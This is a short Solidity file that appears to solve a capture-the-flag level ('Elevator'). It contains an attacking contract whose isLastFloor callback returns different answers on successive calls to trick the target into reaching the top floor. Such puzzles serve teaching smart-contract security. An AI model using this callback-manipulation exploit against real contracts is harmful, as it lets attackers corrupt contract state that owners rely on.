// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface Elevator   {
    function goTo(uint) external;
}

contract Building  {

    bool top;

    function attack(address elevatorContract) public {
        Elevator elevator = Elevator(elevatorContract);
        elevator.goTo(69);
    }

    function isLastFloor(uint) external returns (bool) {
        if (top) {
            return true;
        } else {
            top = true;
            return false;
        }
    }
}
